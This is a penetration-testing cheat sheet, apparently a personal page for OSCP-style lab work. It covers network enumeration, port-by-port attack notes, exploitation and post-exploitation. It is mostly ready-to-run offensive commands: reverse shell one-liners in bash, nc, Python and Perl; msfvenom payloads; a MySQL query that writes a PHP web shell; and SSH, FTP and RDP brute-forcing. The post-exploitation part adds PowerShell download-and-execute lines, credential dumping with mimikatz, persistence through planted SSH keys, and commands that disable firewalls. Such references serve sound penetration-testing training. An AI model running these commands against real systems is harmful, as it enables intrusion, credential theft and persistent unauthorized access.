---
layout: page
title: System
permalink: /system/
---

# Index
* [Enumeration](#enumeration)
* [Vulnerability Analysis](#vulnerability-anaylsis)
* [Exploitation](#exploitation)
* [Post Exploitation](#post-exploitation)

---

## Enumeration

The key to enumeration is patience.

### Passive Information Gathering

* nslookup - Plus modes for mx, etc
* the harvester - email addresses
* google
* Google Hacking Database (GHDB)
* netcraft: Web server information gathering website 
* whois: name server, registrar and contact info for domain names 
* Maltego
* recon-ng: a full-featured web reconnaissance framework written in Python #really cool 
* shodan: IOT search engine

### DNS Enumeration

* `host`: DNS lookup utility + zone transfers 
* `dnsenum`: 
* `dnsrecon`: advanced, modern, automated, cool

### Domain Wide Enumeration

* `nmap ping sweep`: for live hosts
* `nmap -sT -A --top-ports=20 -iL nmap-ping-sweep-ips.txt -oA top20-port-scan-sT-A`: scan top 20 ports on live hosts
* `nmblookup`
* `ntbscan` Netbios scan
* `onesixtyone` SNMP scan
* `snmpwalk` SNMP walk
* `snmpbulkwalk`
* `nprobe2` OS fingerprinting

### Targeted Enumeration

#### nmap

Quick Scan

```
nmap -sC -sV -O 10.10.10.10 -oN nmap-sV-sC-O
```

Full TCP Scan

```
nmap -p- --min-rate 10.10.10.10 -oN nmap-full-tcp
```

UDP Scan

```
nmap -sU 10.10.10.10 -oN nmap-udp
```

Then perform further script scans against identified services as below.

If continually timing out try

```
-min-rtt-timeout 2
```

---

## Vulnerability Anaylsis

### Common Ports and How to exploit

#### 21: FTP

Banner grab for version. Several clients are directly exploitable. Can sometimes 'bounce' to map from remote client, useful behind firewall.

Often allows anonymous login, which depending on allowed directories can disclose information, allow us to upload a reverse shell to web root, add a schedule task, etc.

```
hydra -L USER_LIST -P PASS_LIST -f -o phydra.txt -u 10.10.10.10 -s 21 ftp
```

```
nmap -sV -Pn -vv -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN nmap-ftp 10.10.10.10
```

#### 22: SSH

Banner grab for version. Some are directly exploitable, others allow user enumeration.

```
hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh #default hydra seems faster than default medusa
```

```
medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h 10.10.10.10 - 22 -M ssh
```

OpenSSH 2.3 - 7.7 has an enumerate users exploit.

```
python 45233.py --userList /usr/share/wordlists/metasploit/unix_users.txt 10.11.1.44 --outputFile ssh-users2
```

```
auxiliary/scanner/ssh/ssh_enumusers
```

#### 23: Telnet

Banner grab for version, several clients are exploitable.

brute force with hydra
```
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
```

#### 25: SMTP

Server to server Simple Mail Transfer Protocol. Can not read mail, but can send and verify users. Can interact manually with nc and specific commands, or use scripts for user enum.

Get server commands
```
nmap -script smtp-commands.nse 192.168.1.101
```
Use command to enum users
```
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
```
Metasploit modules
```
auxiliary/scanner/smtp/smtp_enum
````

#### 53: DNS

Attempt a zone transer
```
dnsrecon -t axfr -d 10.10.10.10
```

#### 69: TFTP

FTP over UDP. Has exploitable clients, may allow anonymous access.

Can brute force files with metasploit or other scripts.

#### 80: HTTP

Check /robots.txt, /admin, /login etc for quick wins

General web scanner
```
nikto -h http://10.10.10.10
```

Brute force directories
```
gobuster -u 10.10.10.10 -w /usr/share/wordlists/Seclists/Discovery/Web_Content/common.txt -t 80
```

Check available requests
```
curl -vX options 192.168.1.1
```

A fairly comprehensive Gobuster scan, might need to add flags for extensions and directories ending in slashes
```
gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/wordlists/Seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
```

#### 88: Kerberos

Kerberos on 88 usually fingers a Windows Domain Controller.

Check out MS14-068.

#### 110/995: POP3

POP3 fetches emails from a server.

```
telnet 192.168.1.105 110
USER pelle@192.168.1.105
PASS admin

# List all emails
list

# Retrive email number 5, for example
retr 5
```

#### 111: RPCBIND

Get list of services running on rpc.
```
rpcinfo 192.168.1.101
```

#### 135: MS-RPC

Microsoft's RPC Port. RPCs can be made over raw TCP as well as over SMB. `PSExec` can play with rpc. 

```
nmap 192.168.0.101 --script=msrpc-enum
```
```
rpcclient -U "" 192.168.1.101
```

#### 137/8?: Netbios

Allows communication between applications such as printer or other computer in Ethernet or token ring network via NETBIOS name. 
NETBIOS name is 16 digits long character assign to a computer in workgroup by WINS for name resolution of an IP address into NETBIOS name. 

```
nmblookup -A 10.10.10.10
```

```
enum4linux -av 10.10.10.10
```

#### 139/445: SMB/Samba

Allows devices to perform a number of functions on each other over a (usually local) network. Usually used for file shares, sharing printers and RPC. Samba is the Linux implementation of this Windows protocol. 
SMB runs directly over TCP (port 445) or over NetBIOS (usually port 139, rarely port 137 or 138). 
The ADMIN$ share can basically be thought of as a symbolic link to the path C:\Windows. 
The IPC$ share is a little different. It does not map to the file system directly, instead providing an interface through which remote procedure calls (RPC) can be performed. 
Servers running SMB are often vulnerable to MS17-010 

*Check the version number for direct exploits*

If enum4linux and smbclient/rpcclient doesn't return the SMB/Samba version, there is a metasploit module for it. However the most reliable method is to set up wireshark with a display filter `tcp.port == 445` and make a connection.

```
enum4linux -av 10.10.10.10
```

```
smbclient -L 192.168.1.102
```

```
nmap -sV -Pn -vv -p $port --script=smb-enum-users,smb-enum-shares -on nmap-smb-enum 10.10.10.10
```

```
nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
```

```
nmap -sV -Pn -vv -p 139,$port --script=smb-vuln* --script-args=unsafe=1 -oN nmap-smb-vuln 10.10.10.10
```

#### 143/993: IMAP

Connect with Telnet.

#### 161/162: SNMP

SNMP scan
```
onesixtyone
``` 
```
snmp-check 10.10.10.10
```
```
"nmap -sV -Pn -vv -p161 --script=snmp-netstat,snmp-processes -on nmap-snmp 10.10.10.1
```

#### 389/636: Ldap

```
ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"
```

```
nmap -p 389 --script ldap-search <host>
```

#### 443: HTTPS

Check for Heartbleed, inspect certificate.

```
sslscan 192.168.101.1:443
```

#### 631: Cups

Common UNIX Printing System, usually not externally open, visible internally with `netstat`
Check version, several privilege escalation vectors.

#### 1433: MsSQL

Microsoft SQL

Connect with default service account
```
sqsh -S 192.168.1.101 -U sa
```
Metasploit module to brute force login
```
scanner/mssql/mssql_login
```
```
nmap -vv -sV -Pn -p 3306 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa -on nmap-mssql 10.10.10.10
```

#### 1521: Oracle Database

```
tnscmd10g
```
```
auxiliary/scanner/oracle/sid_brute
```
https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573

#### 2049: NFS

```
showmount -e 192.168.1.109
```

```
mount 192.168.1.109:/ /tmp/NFS
mount -t 192.168.1.109:/ /tmp/NFS
```

#### 2100: Oracle XML DB

Can connect with ftp
```
ftp
```

Searchsploit for exploits.
Default logins: sys:sys scott:tiger

#### 3306: MySQL

Default creds root:root
Use these to connect:

```
mysql --host=192.168.1.101 -u root -p
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname> -u ""@localhost
telnet 192.168.0.101 3306
```
If you get this error, the server is set up to only allow login from 127.0.0.1, a normal security measure.

`ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server`

If you can access it from the web you can usually use it to outfile a shell to a public web path.

```
SELECT '<?php system($_GET[\'cmd\']) ?>' INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell2.php";
```

**cat /etc/my.cnf**: config file path

A file in the web root often has the creds for the database.

If we have local access and the database is running as root user we can use this to priv esc. I used it against 5.14~

```
https://www.exploit-db.com/exploits/1518/
```

#### 3389: Remote Desktop Protocol

```
rdesktop -u guest -p guest 10.11.1.5 -g 50%
```

Can use nccrack or hydra to brute force

```
ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
```

Ms12-020 comes up in searches but there is no POC code, don't waste time.

#### 5900: VNC

```
vncviewer 192.168.1.109
```

```
use post/windows/gather/credentials/vnc
```
Bruteforce
```
use auxiliary/scanner/vnc/vnc_login
```
```
use auxiliary/scanner/vnc/vnc_none_auth
```
```
crowbar -b vnckey -s 10.10.10.10/32 -p IP -k PASS_FILE
```

#### 8080: Common/Various

Usually a webserver, often Tomcat.

---

## Exploitation

### Reverse Shells

Bash

```
bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
```

nc without -e, very reliable

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
```

Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Upgrading Reverse Shells to TTY

```
# Enter while in reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'

Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

### Payload Creation

msfvenom

```
# PHP Reverse Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php

# Java WAR reverse shell  
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war

# Check Payloads
msfvenom --list payloads

# Check formats
msfvenom --list payloads

# Remember to encode and specify bad chars if necessary

# Migrate straight after exploit (meterpreter)
PrependMigrate=true
```
nishang
`Invoke-PowerShellTcp.ps1`

veil-evasion

hyperion

unicorn

### Payload Compilation/Execution

Compile as 32 bit executable (Linux)

```
gcc -Wall -m32 -o <output> <code>
```

Compile as 64 bit executable (Linux)

```
gcc -Wall -m64 -o <output> <code>
```

Compile windows code on Kali

```
i686-w64-mingw32-gcc shell.c -o shell.exe <libraries>
```

Run windows exploits on Kali

```
wine exploit <params>
```

### Password Attacks

* `hash-identifier`: identify hashes
* `echo "skjgdg67dsg5d67g5sd7" | base64 -d`: decode base64
* `fcrackzip`: crack zip files

#### John the Ripper
```
unshadow passwd shadow > unshadowed #prepare unix passwords for cracking
john unshadowed #brute force
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed #brute force with custom wordlist
```

#### Hashcat
```
# Hashcat SHA512 $6$ shadow file  
hashcat -m 1800 -a 0 hash.txt rockyou.txt --username

#Hashcat MD5 $1$ shadow file  
hashcat -m 500 -a 0 hash.txt rockyou.txt --username

# Hashcat MD5 Apache webdav file  
hashcat -m 1600 -a 0 hash.txt rockyou.txt

# Hashcat SHA1  
hashcat -m 100 -a 0 hash.txt rockyou.txt --force

# Hashcat Wordpress  
hashcat -m 400 -a 0 --remove hash.txt rockyou.txt
```

### Exploit Delivery

* `setoolkit`

---

## Post Exploitation

### Privilege Escalation

#### Linux

Atacking the kernel is the easiest route to Linux priviledge escalation, it is also the fastest to test.

We start with determining our version/checking for exploits.

Get the linux version
```
uname -a
```
Get the distro version
```
cat /etc/*release
```
Search the kernel/distro for exploits
```
searchsploit
``` 
This process can be automated (accuracy may vary) with
```
UnixPrivEsc.sh
```
If we can not exploit the kernel for priv esc then we manually investigate potential misconfigurations.

Try to work from **/dev/shm**, as it is stored in memory

It's a good idea to run commands like netstat, ps, find suids, etc locally and on the machine we are attacking then compare the output.

Fina all the programs we have sudo rights to (requires current user password)
```
sudo -l
```
Find all suid executables. It's a good idea to run this locally as well and compare.
```
find / -perm -4000 2>/dev/null
```
Comprehensive enumeration script
```
LinEnum.sh
```
Automated enum script that suggests exploit, worth looking up others too though
```
LinuxPrivChecker.py
```
If nothing stands out then we go through g0tm1lk's guide.

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

#### Windows

First we start with trying to exploit the OS.

Get OS/Version/Installed updates. We can google these for MS# or use the below scripts to try determine which ones to try. If we are using XP SP0 or SP1 there is a simple universal service exploit we can use to get system.
```
systeminfo
```
Takes the output of systeminfo and tells us if there are any viable exploits
```
Windows-Exploit-Suggester
```
Looks for missing patches for priv esc vectors, requires powershell
```
sherlock.ps1
```
Run against a meterpreter session for suggested exploits
```
msfconsole local_exploit_suggester
```
A meterpreter session can attempt to upgrade itself
```
meterpreter getsystem
``` 
General privesc scan script
```
windows-privesc-check
```
General privesc powershell script
```
powerup.ps1
```
https://github.com/SecWiki/windows-kernel-exploits : Exploits with examples/precompiled

If none of the above work then we need to attempt priv esc manually.

Follow the fuzzysecurity guide
http://www.fuzzysecurity.com/tutorials/16.html

If a user has this flag we can exploit for admin
```
SEDebugPriviledge
```
If all the above fails we are left with password attacks

Windows NT/2000/XP/2003 NTLM and LanMan Password Grabber. I think works up to Windows 10
```
pwdump\fgdump
```
Win XP-7, gets NTLM hashes, Kerberos tickets and plaintext passwords. Requires local admin
```
windows credential editor
```
While not priv esc, we can get current user credentials hash snarf via samba/http metasploit modules

Extracts plaintexts passwords, hash, PIN code and kerberos tickets from memory, pass-the-hash, pass-the-ticket, build Golden tickets, play with certificates or private keys. Most functions require admin. Win XP-10
```
mimikatz
```

#### Common Remote Exploits for Windows Versions 
 
`MS17-010`: The reworked NSA exploits work on all unpatched versions, 32-bit and 64-bit architectures, of Windows since 2000 

`exploit/windows/smb/ms17_010_psexec`

`auxiliary/admin/smb/ms17_010_command`
 
`MS08-067`: give the most reliable shells on Windows 2003 Server and Windows XP. Also works on 2000, XP, 2003 

`exploit/windows/smb/ms08_067_netapi`

`MS06-040`: Windows 2000?

`exploit/windows/smb/ms06_040_netapi`

`MS03-026`: Window NT

`exploit/windows/dcerpc/ms03_026_dcom`

`MS05-039`: replaced by MS06-040, still viable 

`exploit/windows/smb/ms05_039_pnp`

### Maintaining Access

* upload reverse shell to web root
* steal SSH keys
* Add our `id_rsa.pub` to any `authorized_keys` for users we can write too
* add user account/add to rdesktop users
* upload nc/sbd/cryptcat etc and set up reverse shell

### Transferring Files

* meterpreter upload
* `python -m SimpleHTTPServer 80`
* Linux: many options, wget, curl, ftp, check what is installed
* Windows: TFTP (up to Windows XP by default), VBScript or Powershell, also check for FTP/Webdav/etc
* Windows: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"`
* Execution Powerhshell Scripts from CMD shell: `powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File script.ps1`
* Execute Powershell as x64 from x32 shell %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
* Download and Execute Powershell Script: `powershell "IEX(New-Object New.WebClient).DownloadString('http://IPaddress/reverse_shell.ps1')"` (note: append main function to end of script)
* Windows: Can use debug.exe to compile a program like nc as a last resort
* Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`

### Finding Open Ports to Connect Back

* `nc -nvv -w 1 -z <your kali ip> 1-100`: loop through ports looking for open one
* Write a bash script to curl through all ports and set up tcdump and filter for TCP-SYN on Kali
* Try connect to port test website
* Upload nmap?

### Capturing Traffic

* `tcpdump`
* `tcpflow` helps logically parse pcap files
* `wireshark`
* `ettercap`
* `dsniff` find passwords, emails, usernames, etc in network traffic

### Pivoting

#### SSH Forwarding

From within a SSH connection press ~ to open control sequences to set up/list forwarding etc.
https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences

https://serverfault.com/questions/379344/selecting-interface-for-ssh-port-forwarding

https://superuser.com/questions/588591/how-to-make-ssh-tunnel-open-to-public

#### Local Fowarding

Make services on a remote system/network accessible to your attacking pc.

From the attacking pc run

```
ssh –L port:destination_host:destination_port username@pivot_host
```

**Use Case 1**: Connect to service that isn't reachable externally

Say a host is running a web server that only it can reach.

```
ssh -L 90:127.0.0.1:80 username@pivot_host
```

Now if wget localhost:90 from the attacking machine we reach the web server on the pivot host.

**Use Case 2:** Connect to service on third system through the pivot host

Say a host is running a web server we can't reach but our ssh server can (dual homed, blocked by firewall, etc).

```
ssh -L 90:third system:80 username@pivot_host
```

Now if wget localhost:90 from the attacking machine we reach the web server on the third system.

#### Reverse Forwarding

Make services on the attacker system accessible to the remote host.

```
ssh -R [bind_address:]port:host:hostport username@pivot_host
```

**Use Case 1**: Forward connections to server's port to attacking system

The SSH server will be able to access TCP port 80 on the attacking system by connecting to 127.0.0.1:8000 on the SSH server.

```
ssh -R 127.0.0.1:8000:127.0.0.1:80 username@pivot_host
```

**Use Case 2**: Forward connection to server's port to third machine through attacking machine

The SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the attacking machine) by connecting to 127.0.0.1:8000 on the SSH server.

```
ssh -R 127.0.0.1:8000:172.16.0.99:80 10.0.0.1
```

#### Dynamic Forwarding

Sets up a dynamic portforward SOCKS proxy.

```
ssh -D 9050 10.0.0.1
```
Then we use proxychains on our attacking machine to automatically forward connections to correct ports.

#### sshuttle

sshuttle is a simple transparent ssh proxy. It handles forwarding on all ports without requiring a socks proxy. It requires python on the pivot host. It does not proxy DNS by default. It does not proxy ICMP at all.

```
sshuttle -vvr username@pivot_host 10.2.2.0/24 #the subnet to which all traffic should be forwarded through the pivot host
```

#### Notes on Exploits and SSH Tunnelling

If possible use a bind shell, it should work through the tunnel as normal.

If we need to use a reverse shell:
* Set the pivot machine as LHOST, and >1024 port as LPORT.
* Set a reverse forward from the pivot machine LHOST:LPORT to attacking machine ip:listening port
* If using msfconsole exploit `set DisablePayloadHandler true`

ICMP and DNS shells can often connect back to us directly through firewalls in situations that require SSH tunnels.

Attacks that perform commands or add users can be useful in these situations too.

#### Iptables

The nucleur option to stop iptables blocking traffic is

```
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT

iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
```

#### Windows Firewall

The nucleur options to stop Windows Firewall blocking traffic is

```
netSh Advfirewall set allprofiles state off
```

#### Port Forwarding from Windows without SSH install

netsh can do it

### Post Exploitation Frameworks

`empire`: Powershell post exploitation framework

`powersploit`: Powershell post exploitation framework

`Nishang`: Powershell post exploitation framework


## Sources
https://xapax.gitbooks.io/security/

https://github.com/codingo/Reconnoitre

https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#commands


